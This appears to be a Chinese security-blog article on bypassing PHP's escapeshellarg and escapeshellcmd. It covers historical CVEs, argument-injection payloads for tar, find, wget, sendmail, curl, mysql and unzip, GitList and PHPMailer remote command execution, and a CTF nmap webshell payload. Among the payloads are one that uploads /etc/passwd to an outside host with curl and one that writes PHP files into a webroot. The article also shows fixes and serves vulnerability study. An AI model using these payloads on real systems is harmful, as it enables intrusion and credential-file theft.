# PHP-escapeshell-命令执行

阅读量 **394725**

|评论 **5**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-12-18 16:30:08

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/dm/1024_642_/t019be78b4b8668253d.png)

> 最近审计PHP时，频繁出现的escapeshellarg与escapeshellcmd成功勾起了我的 ~~性致~~ 兴趣，深入了解后发现确实漏洞百出
>
> Know it then do it

## escapeshellarg

> string escapeshellarg ( string $arg )

转义字符串`$arg`中的单引号并使用单引号包裹此部分

使得`$arg`只能传递一个参数，且不能执行不同的命令

## escapeshellcmd

> string escapeshellcmd ( string $command )

转义`& # ; ` | * ? ~ < > ^ ( ) [ ] { } $ `、`x0A`和`xF`，`'`和`"`仅在落单时被转义

使得`$command`只能执行一个命令，但可以传递多个参数

## 举个栗子

  * $arg->`172.17.0.2' -v -d a=1`
  * ->escapeshellarg->`'172.17.0.2''' -v -d a=1'`
  * ->escapeshellcmd->`'172.17.0.2'\'' -v -d a=1'`
  * ->`172.17.0.2 -v -d a=1'`

## 历史漏洞

  * Windows下PHP<=4.3.6-[CVE-2004-0542](https://www.securitytracker.com/id/1010410)

    
    
    $find = 'word';
    system('FIND /C /I '.escapeshellarg($find).' c:\where\');
    
    //or
    
    $find = 'word " c:\where\ || dir || ';
    system('FIND /C /I '.escapeshellarg($find).' c:\where\');
    

  * PHP4<=4.4.8与PHP5<=5.2.5-[CVE-2008-2051](https://www.sektioneins.de/en/advisories/advisory-032008-php-multibyte-shell-command-escaping-bypass-vulnerability.html)

    
    
    //需要有可变宽度字符集的shell环境（例如GBK、EUC-KR、SJIS）
    
    $text = "sth";
    system(escapeshellcmd("echo ".$text));
    
    $text = "sth xc0; id";
    system(escapeshellcmd("echo ".$text));
    
    //or
    
    $text1 = 'word';
    $text2 = 'word2';
    system('echo '.escapeshellarg($text1).' '.escapeshellarg($text2));
    
    $text1 = "word xc0";
    $text2 = "; id ; #";
    system('echo '.escapeshellarg($text1).' '.escapeshellarg($text2));
    

  * Windows下PHP5.4.42以下, 5.5.26以下的5.5.x, 5.6.10以下的5.6.x-[CVE-2015-4642](https://bugs.php.net/bug.php?id=69646)

    
    
    //向函数传递额外的`(--param3)`
    
    $a = 'param1_value';
    $b = 'param2_value';
    system('my_command --param1 ' . escapeshellarg($a) . ' --param2 ' . escapeshellarg($b));
    
    $a = 'a\';
    $b = 'b -c --param3\';
    system('my_command --param1 ' . escapeshellarg($a) . ' --param2 ' . escapeshellarg($b));
    

  * PHP7.0.2以下的7.x-[CVE-2016-1904](https://bugs.php.net/bug.php?id=71270)

> 如果向`escapeshellarg`或`escapeshellarg`传递1024兆个字节，则可能会触发堆溢出

  * Windows下5.4.43以下的5.4.x, 5.5.27以下的5.5.x, 5.6.11以下的5.6.x-[Bugs](https://bugs.php.net/bug.php?id=69768)

    
    
    //EnableDelayedExpansion`为`enabled`时，`!STH!`的特性类似于`%STH%`，而`escapeshellarg`并未处理`!`
    //可以在HKLM或HKCU下的注册表中设置EnableDelayedExpansion
    
    [HKEY_CURRENT_USERSoftwareMicrosoftCommand Processor]
    "DelayedExpansion"= (REG_DWORD)
    1=enabled 0=disabled (default)
    
    // Leak appdata dir value
    $text = '!APPDATA!';
    print "echo ".escapeshellarg($text);
    

  * PHP5.6.18以下-[Bugs](https://bugs.php.net/bug.php?id=71039)

    
    
    //`ext/standard/exec.c`中
    
    echo escapeshellarg("helloworld");
    =>
    hello
    

## 参数注入

由上文可以看出，当存在`escapeshellarg`或`escapeshellcmd`时均不可能执行第二个命令，但仍能传递多个参数给`escapeshellcmd`，漏洞可造成的危害取决于当前程序所拥有的功能

###  tar

  * 将`some_file`压缩至`/tmp/sth`

    
    
    $command = '-cf /tmp/sth /some_file';
    system(escapeshellcmd('tar '.$command));
    

  * 创建`/tmp/exploit`空文件

    
    
    $command = "--use-compress-program='touch /tmp/exploit' -cf /tmp/passwd /etc/passwd";
    system(escapeshellcmd('tar '.$command));
    

###  find

  * 在`/tmp`目录下查找`some_file`

    
    
    $file = "some_file";
    system("find /tmp -iname ".escapeshellcmd($file));
    

  * 输出`/etc/passwd`的内容

    
    
    $file = "sth -or -exec cat /etc/passwd ; -quit";
    system("find /tmp -iname ".escapeshellcmd($file));
    

###  wget

  * 下载`example.php`

    
    
    $url = 'http://example.com/example.php';
    system(escapeshellcmd('wget '.$url));
    

  * 保存`.php`文件至指定目录

    
    
    $url = '--directory-prefix=/var/www/html http://example.com/example.php';
    system(escapeshellcmd('wget '.$url));
    

###  sendmail

  * 将发件人地址设置为`[from@sth.com](mailto:from@sth.com)`并发送`mail.txt`

    
    
    $from = 'from@sth.com';
    system("/usr/sbin/sendmail -t -i -f".escapeshellcmd($from ).' < mail.txt');
    

  * 输出`/etc/passwd`的内容

    
    
    $from = 'from@sth.com -C/etc/passwd -X/tmp/output.txt';
    system("/usr/sbin/sendmail -t -i -f".escapeshellcmd($from ).' < mail.txt');
    

###  curl

  * 获取`http://example.com`的内容

    
    
    $url = 'http://example.com';
    system(escapeshellcmd('curl '.$url));
    

  * 将`/etc/passwd`发送到`http://example.com`

    
    
    $url = '-F password=@/etc/passwd http://example.com';
    system(escapeshellcmd('curl '.$url));
    
    
    
    file_put_contents('passwords.txt', file_get_contents($_FILES['password']['tmp_name']));
    

###  mysql

  * 执行SQL语句

    
    
    $sql = 'SELECT sth FROM table';
    system("mysql -uuser -ppassword -e ".escapeshellarg($sql));
    

  * 执行`id`命令

    
    
    $sql = '! id';
    system("mysql -uuser -ppassword -e ".escapeshellarg($sql));
    

###  unzip

  * 从`archive.zip`中解压所有`.tmp`文件至`/tmp`目录

    
    
    $zip_name = 'archive.zip';
    system(escapeshellcmd('unzip -j '.$zip_name.' *.txt -d /aa/1'));
    

  * 从`archive.zip`中解压所有`.tmp`文件至`/var/www/html`目录

    
    
    $zip_name = '-d /var/www/html archive.zip';
    system('unzip -j '.escapeshellarg($zip_name).' *.tmp -d /tmp');
    

### 若未设置`LANG`环境变量则跳过非ASCII字符

    
    
    $filename = 'résumé.pdf';
    // string(10) "'rsum.pdf'"
    var_dump(escapeshellarg($filename));
    setlocale(LC_CTYPE, 'en_US.utf8');
    //string(14) "'résumé.pdf'" 
    var_dump(escapeshellarg($filename));
    

### 使用`.bat`执行命令

  * 列出`somedir`中的文件

    
    
    $dir = "somedir";
    file_put_contents('out.bat', escapeshellcmd('dir '.$dir));
    system('out.bat');
    

  * 同时执行`whoami`命令

    
    
    $dir = "somedir x1a whoami";
    file_put_contents('out.bat', escapeshellcmd('dir '.$dir));
    system('out.bat');
    

可参阅：[如何在Windows上传递参数至新进程](http://daviddeley.com/autohotkey/parameters/parameters.htm#WINPASS)

### 结合`escapeshellcmd`与`escapeshellarg`

####  此时可以向函数传递第二个参数

  * 列出`/tmp`中的文件并忽略`sth`

    
    
    $arg = "sth";
    system(escapeshellcmd("ls --ignore=".escapeshellarg($arg).' /tmp'));
    

  * 使用长列表模式输出`/tmp`中的文件并忽略`sth`

    
    
    $arg = "sth' -l ";
    // ls --ignore='exploit'\'' -l ' /tmp
    system(escapeshellcmd("ls --ignore=".escapeshellarg($arg).' /tmp'));
    

## GitList

GitList
0.6的[源代码](https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322)中，存在参数注入导致的远程命令执行

    
    
    public function searchTree($query, $branch)
    {
        if (empty($query)) {
            return null;
        }
    
        $query = escapeshellarg($query);
    
        try {
            $results = $this->getClient()->run($this, "grep -i --line-number {$query} $branch");
        } catch (RuntimeException $e) {
            return false;
        }
    }
    

上述代码可简化为：

    
    
    $query = 'sth';
    system('git grep -i --line-number '.escapeshellarg($query).' *');
    

由[git-grep文档](https://git-scm.com/docs/git-grep)可知，`--open-files-in-pager`类似于`find`命令的`-exec`

    
    
    $query = '--open-files-in-pager=id;';
    system('git grep -i --line-number '.escapeshellarg($query).' *');
    

###  修复方案

p神曾经分析过，漏洞最佳解决方案为将`$query`作为`-e`参数的值，即`git grep -i --line-number -e '--open-files-in-pager=id;' master`，不过gitlist采取了另外一种措施：

    
    
    //将`-`替换后在`$query`前加上`--`
    <?php
    public function searchTree($query, $branch)
    {
        if (empty($query)) {
            return null;
        }
        $query = preg_replace('/(--?[A-Za-z0-9-]+)/', '', $query);
        $query = escapeshellarg($query);
        try {
            $results = $this->getClient()->run($this, "grep -i --line-number -- {$query} $branch");
        } catch (RuntimeException $e) {
            return false;
        }
    

## PHPMailer

PHPMailer的[源代码](https://github.com/php/php-src/blob/PHP-5.6.29/ext/standard/mail.c)中，存在参数注入导致的远程命令执行

    
    
    if (force_extra_parameters) {
        extra_cmd = php_escape_shell_cmd(force_extra_parameters);
    } else if (extra_cmd) {
        extra_cmd = php_escape_shell_cmd(extra_cmd);
    }
    
    if (php_mail(to_r, subject_r, message, headers_trimmed, extra_cmd TSRMLS_CC)) {
        RETVAL_TRUE;
    } else {
        RETVAL_FALSE;
    }
    

上述代码可简化为：

    
    
    <?php
    $param = "172.17.0.2" -v -d a=1";
    $ep = escapeshellarg($param);
    $eep = escapeshellcmd($ep);
    $cmd = "curl " . $eep;
    system($cmd);
    

当两个函数以`->escapeshellarg->escapeshellcmd->`的顺序配合使用时，则会存在参数注入。`a'(
-OQueueDirectory=/tmp -X/var/www/html/x.php )[@a](https://github.com/a
"@a").com`最终变成了`'-fa'\''( -OQueueDirectory=/tmp -X/var/www/html/test.php
)[@a](https://github.com/a
"@a").com'`，但若将其顺序调换则不会出现此问题，即`->escapeshellcmd->escapeshellarg->`

## Nmap命令执行

  * 一道Web安全测试南京总决赛时的CTF题

    
    
    <?php
    include("flag.php");
    if(!isset($_GET['host'])){
        highlight_file(__FILE__);
    }else{
        $host =(string)$_GET['host'];
        $host=escapeshellarg($host);
        $host=escapeshellcmd($host);
        $sandbox = md5("box".$_SERVER['REMOTE_ADDR']);
        echo "you are in sandbox: ".$sandbox."<br/>";
        @mkdir($sandbox);
        chdir($sandbox);
        echo "<pre>";
        echo system("nmap -T5  -sT -Pn --host-timeout 2 -F  ".$host);
        echo "</pre>";
    }
    ?>
    

因为输入流先进`escapeshellarg`函数，再进`escapeshellcmd`函数，所以存在参数注入。随后可利用nmap的`-oN`参数将Webshell写入沙盒文件夹。

###  逃逸单引号

Payload：`?host=' <?php phpinfo();?> -oN shell.php '`

## 参考资料

[参考资料0](https://paper.seebug.org/164/)，[参考资料1](https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html#gitlist-rce-exploit)，[参考资料2](https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **[x]** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/168093](/post/id/168093)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [CVE](/tag/CVE)
  * [PHP](/tag/PHP)
  * [escapeshellarg](/tag/escapeshellarg)
  * [escapeshellcmd](/tag/escapeshellcmd)

 **+1** __13赞

 __收藏

![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg) [x]

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

